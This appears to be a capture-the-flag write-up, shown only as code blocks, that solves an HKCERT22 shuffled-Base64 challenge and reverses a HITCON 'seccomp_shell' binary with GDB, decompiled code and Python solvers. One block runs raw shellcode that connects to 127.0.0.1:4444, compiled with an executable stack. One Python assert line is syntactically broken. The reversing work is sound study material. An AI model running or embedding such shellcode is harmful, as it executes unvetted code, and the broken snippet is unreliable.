<pre class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">sorted</span><span class="token punctuation">(</span>whitelist<span class="token punctuation">[</span><span class="token string">'J'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># 'ABEFIJMNQRUVYZcd'</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_inverted_chars_with_mask</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token punctuation">{</span>c <span class="token keyword">for</span> i<span class="token punctuation">,</span> c <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>charset<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">6</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> i<span class="token punctuation">)</span> <span class="token operator">&amp;</span> m<span class="token punctuation">)</span> <span class="token operator">==</span> m<span class="token punctuation">}</span>

<span class="token comment"># chars that don't have bits set in ascii.</span>
subchars_not_in_ascii <span class="token operator">=</span> <span class="token punctuation">[</span>get_inverted_chars_with_mask<span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token keyword">for</span> m <span class="token keyword">in</span> in_ascii<span class="token punctuation">]</span></code></pre>
<pre data-lang-off="" class="language-text" tabindex="0"><code class="language-text">V2UncmUgbm8gc3RyYW5nZXJzIHRvIGxvdmUKWW91IGtub3cgdGhlIHJ1bGVzIGFuZCBzbyBkbyBJIChkbyBJKQpBIGZ1bGwgY29tbWl0bWVudCdzIHdoYXQgSSdtIHRoaW5raW5nIG9mCllvdSB3b3VsZG4ndCBnZXQgdGhpcyBmcm9tIGFueSBvdGhlciBndXkKSSBqdXN0IHdhbm5hIHRlbGwgeW91IGhvdyBJJ20gZmVlbGluZwpHb3R0YSBtYWtlIHlvdSB1bmRlcnN0YW5kCk5ldmVyIGdvbm5hIGdpdmUgeW91IHVwCk5ldmVyIGdvbm5hIGxldCB5b3UgZG93bgpOZXZlciBnb25uYSBydW4gYXJvdW5kIGFuZCBkZXNlcnQgeW91Ck5ldmVyIGdvbm5hIG1ha2UgeW91IGNyeQpOZXZlciBnb25uYSBzYXkgZ29vZGJ5ZQpOZXZlciBnb25uYSB0ZWxsIGEgbGllIGFuZCBodXJ0IHlvdQo=</code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token comment"># Dictionary of guessed mappings.</span>
<span class="token comment"># key: shuffled Base64; value: plain Base64</span>
guesses <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">'w'</span><span class="token punctuation">:</span> <span class="token string">'G'</span><span class="token punctuation">,</span>       <span class="token string">'Y'</span><span class="token punctuation">:</span> <span class="token string">'I'</span><span class="token punctuation">,</span>
    <span class="token string">'o'</span><span class="token punctuation">:</span> <span class="token string">'H'</span><span class="token punctuation">,</span>       <span class="token string">'c'</span><span class="token punctuation">:</span> <span class="token string">'B'</span><span class="token punctuation">,</span>

    <span class="token comment"># " the "</span>
    <span class="token string">'J'</span><span class="token punctuation">:</span> <span class="token string">'R'</span><span class="token punctuation">,</span>       <span class="token string">'P'</span><span class="token punctuation">:</span> <span class="token string">'o'</span><span class="token punctuation">,</span>
    <span class="token string">'0'</span><span class="token punctuation">:</span> <span class="token string">'Z'</span><span class="token punctuation">,</span>       <span class="token string">'H'</span><span class="token punctuation">:</span> <span class="token string">'S'</span><span class="token punctuation">,</span>

    <span class="token comment"># More snipped out.</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>
<span class="token keyword">for</span> c<span class="token punctuation">,</span> g <span class="token keyword">in</span> guesses<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># Our guess should be whitelisted!</span>
    <span class="token keyword">assert</span> <span class="token builtin">set</span><span class="token punctuation">(</span>g<span class="token punctuation">)</span><span class="token punctuation">.</span>issubset<span class="token punctuation">(</span>whitelist<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">for</span> gc <span class="token keyword">in</span> g<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f'mismatch for </span><span class="token interpolation"><span class="token punctuation">{</span>c<span class="token punctuation">}</span></span><span class="token string"> -&gt; </span><span class="token interpolation"><span class="token punctuation">{</span>g<span class="token punctuation">}</span></span><span class="token string">, whitelist: </span><span class="token interpolation"><span class="token punctuation">{</span>whitelist<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string">'</span></span>
    whitelist<span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token operator">=</span> g <span class="token comment"># Throw away all other values.</span></code></pre>
<pre data-lang-off="" class="language-text" tabindex="0"><code class="language-text">hkcert22{b4s3_s1x7y_f0ur_1s_4n_3nc0d1n9_n07_4n_encryp710n}</code></pre>
<pre data-lang-off="" class="language-txt" tabindex="0"><code class="language-txt">server
run</code></pre>
<pre class="language-c" tabindex="0"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> shellcode<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\xeb\x10\x31\xc0\x53\x5f\x49\x8d\x77\x10\x48\x31\xd2\x80\xc2\xff\x0f\x05\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x50\x5b\x48\x97\x68\x7f\x00\x00\x01\x66\x68\x11\x5c\x66\x6a\x02\x54\x5e\xb2\x10\xb0\x2a\x0f\x05\x4c\x8d\x3d\xc5\xff\xff\xff\x41\xff\xe7"</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// Compile with:</span>
<span class="token comment">// gcc main.c  -fno-stack-protector -z execstack &amp;&amp; gdb ./a.out</span></code></pre>
<pre data-lang-off="" class="language-txt" tabindex="0"><code class="language-txt">flag hitcon{test_flag}</code></pre>
<pre class="language-c" tabindex="0"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>param_3 <span class="token operator">!=</span> <span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	auVar27 <span class="token operator">=</span> <span class="token operator">&lt;</span><span class="token operator">&gt;</span><span class="token operator">::</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token string">"incorrect/"</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> auVar27<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<pre data-lang-off="" class="language-txt" tabindex="0"><code class="language-txt">flag hitcon{AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN}</code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	part1<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
	part2<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>

part3<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> interesting_data_a7516852<span class="token punctuation">)</span></code></pre>
<pre class="language-c" tabindex="0"><code class="language-c"><span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>some_buffer<span class="token punctuation">,</span><span class="token operator">&amp;</span>SOME_ADDRESS<span class="token punctuation">,</span><span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
n <span class="token operator">=</span> <span class="token number">0x40</span><span class="token punctuation">;</span>
puVar21 <span class="token operator">=</span> <span class="token punctuation">(</span>ulong <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>some_buffer_offset_by_4<span class="token punctuation">;</span>
<span class="token keyword">do</span> <span class="token punctuation">{</span>
	uVar23 <span class="token operator">=</span> puVar21<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">0x3f</span> <span class="token operator">&lt;</span> uVar23<span class="token punctuation">)</span>
		<span class="token keyword">goto</span> panic<span class="token punctuation">;</span>
	uVar1 <span class="token operator">=</span> __ptr<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// __ptr :: char[]</span>
	__ptr<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> __ptr<span class="token punctuation">[</span>uVar23<span class="token punctuation">]</span><span class="token punctuation">;</span>
	__ptr<span class="token punctuation">[</span>uVar23<span class="token punctuation">]</span> <span class="token operator">=</span> uVar1<span class="token punctuation">;</span>
	
	uVar23 <span class="token operator">=</span> puVar21<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">0x3f</span> <span class="token operator">&lt;</span> uVar23<span class="token punctuation">)</span>
		<span class="token keyword">goto</span> panic<span class="token punctuation">;</span>
	uVar1 <span class="token operator">=</span> __ptr<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	__ptr<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> __ptr<span class="token punctuation">[</span>uVar23<span class="token punctuation">]</span><span class="token punctuation">;</span>
	__ptr<span class="token punctuation">[</span>uVar23<span class="token punctuation">]</span> <span class="token operator">=</span> uVar1<span class="token punctuation">;</span>
	
	puVar21 <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
	n <span class="token operator">-=</span> <span class="token number">2</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>n <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<pre data-language="GDB" class="command-line language-sh" data-prompt="gdb>" data-continuation-prompt=">" data-continuation-str="  " data-filter-output="out>" tabindex="0"><code class="language-sh">start
out<span class="token operator">&gt;</span>
out<span class="token operator">&gt;</span>Break to determine __ptr location.
<span class="token builtin class-name">break</span> *_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE + <span class="token number">61</span>
out<span class="token operator">&gt;</span>Break to grab permuted string.
<span class="token builtin class-name">break</span> *_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE + <span class="token number">935</span>
out<span class="token operator">&gt;</span>
<span class="token builtin class-name">continue</span>  
server  
run  
flag abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/
out<span class="token operator">&gt;</span><span class="token punctuation">(</span>breakpoint triggered<span class="token punctuation">)</span>
out<span class="token operator">&gt;</span>
out<span class="token operator">&gt;</span>Get location of __ptr.
p <span class="token variable">$rax</span>
out<span class="token operator">&gt;</span><span class="token variable">$1</span> <span class="token operator">=</span> 0x5555555d63e0
<span class="token builtin class-name">continue</span>
out<span class="token operator">&gt;</span><span class="token punctuation">(</span>breakpoint triggered<span class="token punctuation">)</span>
out<span class="token operator">&gt;</span>
out<span class="token operator">&gt;</span>Get permuted string.
x/s 0x5555555d63e0
out<span class="token operator">&gt;</span>Rp5v+AZmM8XWy1sgNhTB/oCzYVdPrGn6KD3Q9lke4qtFxHb0uUOcS2jIEJfL7aiw</code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">import</span> string

p <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> <span class="token string">'+/'</span>
<span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">64</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>

<span class="token comment"># Permuted string obtained from GDB.</span>
permuted <span class="token operator">=</span> <span class="token string">'Rp5v+AZmM8XWy1sgNhTB/oCzYVdPrGn6KD3Q9lke4qtFxHb0uUOcS2jIEJfL7aiw'</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">64</span><span class="token punctuation">]</span>

perm <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">64</span>  <span class="token comment"># Permutation </span>
rperm <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">64</span> <span class="token comment"># Reverse permutation</span>

<span class="token keyword">for</span> i<span class="token punctuation">,</span> c <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">:</span>
	j <span class="token operator">=</span> permuted<span class="token punctuation">.</span>index<span class="token punctuation">(</span>c<span class="token punctuation">)</span>
	perm<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> j
	rperm<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> i</code></pre>
<pre class="language-c" tabindex="0"><code class="language-c"><span class="token keyword">do</span> <span class="token punctuation">{</span>
    uVar23 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    uVar18 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    uVar3 <span class="token operator">=</span> __ptr<span class="token punctuation">[</span>lVar20<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
    uVar19 <span class="token operator">=</span> <span class="token number">0x101</span><span class="token punctuation">;</span>
    <span class="token keyword">do</span> <span class="token punctuation">{</span>
        uVar25 <span class="token operator">=</span> uVar3<span class="token punctuation">;</span>
        uVar27 <span class="token operator">=</span> uVar18<span class="token punctuation">;</span>
        uVar3 <span class="token operator">=</span> uVar19 <span class="token operator">%</span> uVar25<span class="token punctuation">;</span>
        iVar24 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>uVar27<span class="token punctuation">;</span>
        iVar26 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>uVar23<span class="token punctuation">;</span>
        uVar23 <span class="token operator">=</span> uVar27<span class="token punctuation">;</span>
        uVar18 <span class="token operator">=</span> <span class="token punctuation">(</span>ulong<span class="token punctuation">)</span><span class="token punctuation">(</span>iVar26 <span class="token operator">-</span> <span class="token punctuation">(</span>uVar19 <span class="token operator">/</span> uVar25<span class="token punctuation">)</span> <span class="token operator">*</span> iVar24<span class="token punctuation">)</span><span class="token punctuation">;</span>
        uVar19 <span class="token operator">=</span> uVar25<span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">short</span><span class="token punctuation">)</span>uVar3 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    __ptr<span class="token punctuation">[</span>lVar20<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>uVar27 <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">0xf</span><span class="token punctuation">)</span> <span class="token operator">+</span> uVar27 <span class="token operator">+</span>
                    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uVar27 <span class="token operator">&gt;&gt;</span> <span class="token number">0xf</span><span class="token punctuation">)</span> <span class="token operator">-</span> iVar24<span class="token punctuation">)</span> <span class="token operator">+</span> iVar26 <span class="token operator">&amp;</span> <span class="token number">0xffffU</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">0x101</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x71U</span> <span class="token operator">^</span> <span class="token number">0x89</span><span class="token punctuation">;</span>
    lVar20 <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>lVar20 <span class="token operator">!=</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<pre data-language="GDB" class="command-line language-sh" data-prompt="gdb>" data-filter-output="out>" tabindex="0"><code class="language-sh"><span class="token builtin class-name">break</span> *_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE + <span class="token number">1070</span></code></pre>
<pre data-language="GDB" class="command-line language-sh" data-prompt="gdb>" data-filter-output="out>" tabindex="0"><code class="language-sh">x/16wx 0x5555555d63e0</code></pre>
<pre data-language="GDB" class="command-line language-sh" data-prompt="gdb>" data-filter-output="out>" tabindex="0"><code class="language-sh">start
out<span class="token operator">&gt;</span>
out<span class="token operator">&gt;</span>Break before the loop.
<span class="token builtin class-name">break</span> *_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE + <span class="token number">937</span>
out<span class="token operator">&gt;</span>Break after the loop.
<span class="token builtin class-name">break</span> *_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE + <span class="token number">1070</span>
out<span class="token operator">&gt;</span>
<span class="token builtin class-name">continue</span>
out<span class="token operator">&gt;</span><span class="token punctuation">(</span>breakpoint-before-loop triggered<span class="token punctuation">)</span>
out<span class="token operator">&gt;</span>
out<span class="token operator">&gt;</span>Set 8x8 <span class="token operator">=</span> <span class="token number">64</span> bytes. <span class="token punctuation">(</span>I used a Python script to generate these <span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">set</span><span class="token variable">`</span></span> cmds from the missing input bytes.<span class="token punctuation">)</span>
<span class="token builtin class-name">set</span> *<span class="token punctuation">(</span>0x5555555d63e0 as *mut u64<span class="token punctuation">)</span> <span class="token operator">=</span> 0x0001020304050607
<span class="token builtin class-name">set</span> *<span class="token punctuation">(</span>0x5555555d63e8 as *mut u64<span class="token punctuation">)</span> <span class="token operator">=</span> 0x08090a0b0c0d0e0f
out<span class="token operator">&gt;</span>and so on<span class="token punctuation">..</span>.
<span class="token builtin class-name">set</span> *<span class="token punctuation">(</span>0x5555555d6410 as *mut u64<span class="token punctuation">)</span> <span class="token operator">=</span> 0x3c3d3e3f405b5c5d
<span class="token builtin class-name">set</span> *<span class="token punctuation">(</span>0x5555555d6418 as *mut u64<span class="token punctuation">)</span> <span class="token operator">=</span> 0x5e5f607b7c7d7e7f
out<span class="token operator">&gt;</span>
<span class="token builtin class-name">continue</span>
out<span class="token operator">&gt;</span><span class="token punctuation">(</span>breakpoint-after-loop triggered<span class="token punctuation">)</span>
out<span class="token operator">&gt;</span>
out<span class="token operator">&gt;</span>Get mapped bytes.
x/16wx 0x5555555d63e0
out<span class="token operator">&gt;</span><span class="token punctuation">..</span>.
out<span class="token operator">&gt;</span>Repeat <span class="token keyword">until</span> all mappings are deduced<span class="token punctuation">..</span>.</code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token comment"># Values obtained with `x/16wx 0x5555555d63e0`.</span>

<span class="token comment"># Values before mapping.</span>
dst <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
0x5555555d63e0: 0x76357052      0x6d5a412b      0x5758384d      0x67733179
0x5555555d63f0: 0x4254684e      0x7a436f2f      0x50645659      0x366e4772
0x5555555d6400: 0x5133444b      0x656b6c39      0x46747134      0x30624878
0x5555555d6410: 0x634f5575      0x496a3253      0x4c664a45      0x77696137

0x5555555d63e0: 0x04050607      0x00010203      0x0c0d0e0f      0x08090a0b
0x5555555d63f0: 0x14151617      0x10111213      0x1c1d1e1f      0x18191a1b
0x5555555d6400: 0x24252627      0x20212223      0x2d2e3a3b      0x28292a2c
0x5555555d6410: 0x405b5c5d      0x3c3d3e3f      0x7c7d7e7f      0x5e5f607b

-- snip -- to save space --
"""</span>

<span class="token comment"># Values after mapping.</span>
mpd <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
0x5555555d63e0: 0x2e616c58      0xe2cb3269      0xa002e0b3      0xc16b1c86
0x5555555d63f0: 0xd2799cec      0x74d9c29e      0x9f043b0c      0xed14031e
0x5555555d6400: 0xca978fa2      0x39a4d8da      0xaf7e645b      0x0f71930b
0x5555555d6410: 0x0a81fd99      0x3aef66b7      0xe1ff00ee      0x09ab75ad

0x5555555d63e0: 0x51158ddb      0xfb7b4ebb      0xaab260eb      0xb0aca58e
0x5555555d63f0: 0x2bc6a635      0x635cde42      0xbd24b1e3      0x3043d65f
0x5555555d6400: 0x7c6d8b17      0x8ca7d52a      0x59a92706      0x9d83fe10
0x5555555d6410: 0x41a880c0      0x25dc5ee7      0xc42d4ff9      0x164d2f6a

-- snip --
"""</span>

<span class="token keyword">def</span> <span class="token function">mkbytes</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>bs<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token operator">*</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> l <span class="token keyword">in</span> s<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token keyword">if</span> l<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> bs <span class="token keyword">in</span> l<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

dbytes <span class="token operator">=</span> mkbytes<span class="token punctuation">(</span>dst<span class="token punctuation">)</span>
mbytes <span class="token operator">=</span> mkbytes<span class="token punctuation">(</span>mpd<span class="token punctuation">)</span>

mp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">256</span>  <span class="token comment"># Value map.</span>
rmp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">256</span> <span class="token comment"># Reverse value map.</span>
<span class="token keyword">for</span> a<span class="token punctuation">,</span> b <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>dbytes<span class="token punctuation">,</span> mbytes<span class="token punctuation">)</span><span class="token punctuation">:</span>
    mp<span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">=</span> b
    rmp<span class="token punctuation">[</span>b<span class="token punctuation">]</span> <span class="token operator">=</span> a

<span class="token comment"># Assert bijection.</span>
<span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>mp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>rmp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">256</span></code></pre>
<pre class="language-c" tabindex="0"><code class="language-c">local_278 <span class="token operator">=</span> alloc<span class="token operator">::</span>raw_vec<span class="token operator">::</span>RawVec<span class="token operator">&lt;</span>T<span class="token punctuation">,</span>A<span class="token operator">&gt;</span><span class="token operator">::</span><span class="token function">allocate_in</span><span class="token punctuation">(</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">memcpy</span><span class="token punctuation">(</span>local_278<span class="token punctuation">.</span>_0_8_<span class="token punctuation">,</span><span class="token operator">&amp;</span>DAT_00162b2b<span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<pre class="language-c" tabindex="0"><code class="language-c">local_238 <span class="token operator">=</span> <span class="token number">0x526851a7</span><span class="token punctuation">;</span>
local_234 <span class="token operator">=</span> <span class="token number">0x31ff2785</span><span class="token punctuation">;</span>
local_230 <span class="token operator">=</span> <span class="token number">0xc7d28788</span><span class="token punctuation">;</span>
local_22c <span class="token operator">=</span> <span class="token number">0x523f23d3</span><span class="token punctuation">;</span>
local_228 <span class="token operator">=</span> <span class="token number">0xaf1f1055</span><span class="token punctuation">;</span>
local_224 <span class="token operator">=</span> <span class="token number">0x5c94f027</span><span class="token punctuation">;</span>
<span class="token comment">// -- snip --</span></code></pre>
<pre class="language-asm" tabindex="0"><code class="language-asm"><span class="token operator">-</span><span class="token operator">-</span> snip <span class="token operator">-</span><span class="token operator">-</span>
  b2:   0f <span class="token number">05</span>                   syscall             <span class="token comment">; read from /dev/zero</span>
  b4:   <span class="token number">58</span>                      pop    rax          <span class="token comment">; rax = 0</span>
  b5:   <span class="token number">48</span> f7 d0                not    rax          <span class="token comment">; exercise for the reader</span>
  b8:   <span class="token number">48</span> c1 e8 1d             shr    rax<span class="token punctuation">,</span> <span class="token number">0x1d</span>    <span class="token comment">;</span>
  bc:   <span class="token number">48</span> <span class="token number">99</span>                   cqo                 <span class="token comment">;</span>
  be:   6a <span class="token number">29</span>                   push   <span class="token number">0x29</span>         <span class="token comment">;</span>
  c0:   <span class="token number">59</span>                      pop    rcx          <span class="token comment">;</span>
  c1:   <span class="token number">48</span> f7 f1                div    rcx          <span class="token comment">;</span>
  c4:   <span class="token number">49</span> <span class="token number">96</span>                   xchg   r14<span class="token punctuation">,</span> rax     <span class="token comment">; swap r14 and rax</span>
  c6:   6a <span class="token number">03</span>                   push   <span class="token number">0x3</span>
  c8:   <span class="token number">58</span>                      pop    rax          <span class="token comment">; rax = 3</span>
  c9:   0f <span class="token number">05</span>                   syscall             <span class="token comment">; close()</span>
  cb:   b8 ef be ad de          mov    eax<span class="token punctuation">,</span> <span class="token number">0xdeadbeef</span>  <span class="token comment">; flag input</span>
  d0:   <span class="token number">44</span> <span class="token number">01</span> e0                add    eax<span class="token punctuation">,</span> r12d
  d3:   <span class="token number">44</span> <span class="token number">31</span> e8                xor    eax<span class="token punctuation">,</span> r13d
  d6:   c1 c8 0b                ror    eax<span class="token punctuation">,</span> <span class="token number">0xb</span>
  d9:   f7 d0                   not    eax
  db:   <span class="token number">44</span> <span class="token number">31</span> f0                xor    eax<span class="token punctuation">,</span> r14d        <span class="token comment">; eax = ~(ror(0xb, (0xDEADBEEF + r12) ^ r13)) ^ r14</span>
  de:   3d ef be ad de          cmp    eax<span class="token punctuation">,</span> <span class="token number">0xdeadbeef</span>  <span class="token comment">; static values (expected output)</span>
  e3:   <span class="token number">75</span> <span class="token number">05</span>                   jne    <span class="token number">0xea</span>
  e5:   6a <span class="token number">01</span>                   push   <span class="token number">0x1</span>
  e7:   <span class="token number">58</span>                      pop    rax  <span class="token comment">; rax = 1</span>
  e8:   eb <span class="token number">03</span>                   jmp    <span class="token number">0xed</span>
  ea:   <span class="token number">48</span> <span class="token number">31</span> c0                xor    rax<span class="token punctuation">,</span> rax <span class="token comment">; rax = 0</span>

<span class="token operator">-</span><span class="token operator">-</span> snip <span class="token operator">-</span><span class="token operator">-</span></code></pre>
<pre class="language-c" tabindex="0"><code class="language-c">vec<span class="token punctuation">[</span><span class="token number">0xcc</span><span class="token punctuation">]</span> <span class="token operator">=</span> __ptr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
vec<span class="token punctuation">[</span><span class="token number">0xdf</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xA7</span><span class="token punctuation">;</span>
vec<span class="token punctuation">[</span><span class="token number">0xcd</span><span class="token punctuation">]</span> <span class="token operator">=</span> __ptr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
